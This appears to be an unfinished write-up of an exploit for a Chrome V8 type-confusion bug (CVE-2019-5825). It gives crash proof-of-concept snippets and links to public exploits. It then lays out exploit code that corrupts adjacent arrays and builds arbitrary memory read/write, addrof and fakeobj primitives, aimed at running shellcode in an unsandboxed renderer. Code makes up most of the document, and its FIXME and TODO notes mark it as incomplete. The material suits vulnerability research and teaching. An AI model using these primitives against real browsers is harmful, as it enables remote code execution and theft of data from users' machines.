# crbug-941743

Chrome V8 type confusion [bug](https://crbug.com/941743), assigned CVE-2019-5825

The context for this exploit is a non-sandboxed renderer (otherwise a sandbox escape is also required) that executes user-specified Javascript.  The approach taken involves custom shellcode to support exfiltration using only syscalls and writing its output to user-visible buffer that is later rendered.

## Proof of Concept

The snippet from the Chrome bug

```javascript
var arr = [1]; 
for (var i = 1; i < 30; ++i) {  
    var a2 = arr.map(function(){arr.push(2);}); 
    arr.some(arr.constructor);  
    for (var j = 0; j < 10000; ++j) {} 
}
```

or [here](https://github.com/allpaca/V8Harvest/blob/master/V8Harvest_2019.md#regress-crbug-941743js-chromium-issue)

```javascript
Array(2 ** 30);

let a = [1, 2, , , , 3];
function mapping(a) {
  return a.map(v => v);
};
mapping(a);
mapping(a);
%OptimizeFunctionOnNextCall(mapping);
mapping(a);

a.length = 32 * 1024 * 1024 - 1;
a.fill(1, 0);
a.push(2);
a.length += 500;
mapping(a);  
```

will cause a segfault if the Chrome / V8 version under test is vulnerable.

## Exploit primitives

There is a Metasploit module for this issue [here](https://www.rapid7.com/db/modules/exploit/multi/browser/chrome_array_map/) (source [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/browser/chrome_array_map.rb)).

Which is based on the exploit by Exodus Intel that can be found [here](https://github.com/exodusintel/Chromium-941743/blob/master/exp.js).

```javascript
// Generate a large array to ensure TurboFan won't inline array constructors
Array(2**30);

// Want the following layout in memory
// <Array.map output> <float array> <typed array> <Object>
//
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map
```

An object's map (arrays are objects) is a data structure that contains:
- The dynamic type of the object, eg String, Uint8Array, etc
- The size of the object in bytes
- The properties/fields of the object and where they are stored
- (If an array) The type of the array elements, eg unboxed doubles, tagged pointers, etc
- The prototype of the object if any

While the property names are usually stored in the map, the property values are stored in the object itself in one of several possible regions.  The map provides the exact location of the property in the respective region.

Use %DebugPrint(object) to get info about an object's map. %DebugPrint requires launching d8 with --allow-natives-syntax

Ref: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ "What is a Map?"

FIXME STOPPED

```javascript
// Create a fast, holey smi array
// Fast, holey array refer to the use of arrays internally
// (rather than dictionaries internally for sparse, holey arrays)
// Ref: https://v8.dev/blog/fast-properties
var holey_smi_array = [1, 2, ,,, 3];
var float_array;
var typed_array;
var object;

// Offset of float array length field from the Array.map output
const float_array_length_offset = 23;
// Offset of typed array length field from the Array.map output
const typed_array_length_offset = 24;
// Offset of typed array address pointer from the Array.map output
const typed_array_address_offset = 25;
// Offset of object['b'] from the Array.map output
const object_property_b_offset = 33;

function mapping(array) {
    function callback(_element, index) {
        if (index == 0) {
            float_array = [0.1, 0.2];

            typed_array = new BigUint64Array(2);
            // The n suffix indicates bigint literal 
            typed_array[0] = 0x41414141n;
            typed_array[1] = 0x42424242n;

            object = {'a': 0x31323334, 'b': 1};
            object['b'] = object;
        }

        // Minimize the corruption for stability
        if (index > float_array_length_offset)
            throw 'stop';
        
        return index;
    }

    return array.map(callback);
}

for (let i=0; i<10**5; i++)
    mapping(holey_smi_array);

// Lengthen the array but ensure it points to a array (non-dictionary) store
holey_smi_array.length = (32 * 1024 * 1024) - 1;
holey_smi_array.fill(1, float_array_length_offset, float_array_length_offset + 1);
holey_smi_array.fill(1, float_array_length_offset + 2);
holey_smi_array.push(2);
holey_smi_array.length += 500;

// The elements of holey_smi_array are now:
// (can verify with %DebugPrint with debug d8)
//
//                   0: 1
//                   1: 2
//                 2-4: <hole>
//                   5: 3
//                6-22: <hole>
//                  23: 1
//                  24: <hole>
//         25-33554430: 1
//            33554431: 2
//   33554432-33554931: <hole>

// Exception caused by the throw within the mapping callback
try { mapping(holey_smi_array); } catch (e) { }

// TODO Show the corruption of float_array, typed_array and object.
//      Need to first review writeups/docs defining object/array memory layout.
//      Use gdb and/or addrof/read (defined below) to determine specifics.

var output = function(...args) {
    let s = '';
    for (const arg of args)
        s += arg + ' ';
    document.write(s + '<br/>');
};

if (
  float_array.length == 2 ||
  float_array[typed_array_length_offset + 3].f2i() != 0x41414141 ||
  float_array[typed_array_length_offset + 4].f2i() != 0x42424242 ||
  float_array[typed_array_length_offset + 8].f2i() != 0x3132333400000000n
) {
    output('float_array corruption failed');
}

// TODO Both read and write require offsetting the address by -0x1f
//      Investigate and document why this is necessary.
//      The fakeobj primitive does not seem to require this.

function read(addr) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    let retval = typed_array[0];
    float_array[typed_array_address_offset] = orig_addr;
    return retval;
}

function write(addr, val) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    typed_array[0] = val;
    float_array[typed_array_address_offset] = orig_addr;
}

function addrof(obj) {
    object['b'] = obj;
    return float_array[object_property_b_offset].f2i();
}

function fakeobj(addr) {
    float_array[object_property_b_offset] = addr.i2f();
    return object['b'];
}
```

FIXME

```javascript
// Conversion functions
//
// From the language spec., numbers in Javascript are represented as eight-byte IEEE 754 doubles.
// 
// However 32-bit signed integers are represented as `value << 32` and are called smis (small immediates).
//
// (Tagged) Pointers are represented as word-aligned 64-bit values.
// The least-significant bit is set to one for tagged pointers to distinguish them from smis
// (which would otherwise always be zero due to pointers always being word-aligned).
//
// Note that pointer compression was added in V8 8.0 and is not applicable here.
// Ref: https://v8.dev/blog/pointer-compression
//      https://v8.dev/blog/v8-release-80

var view = new DataView(new ArrayBuffer(8));

Number.prototype.f2i = function() {
    view.setFloat64(0, this);
    return view.getBigUint64(0);
};

Number.prototype.i2f = function() {
    view.setBigUint64(0, BigInt(this));
    return view.getFloat64();
};

BigInt.prototype.i2f = function() {
    view.setBigUint64(0, this);
    return view.getFloat64();
};
```
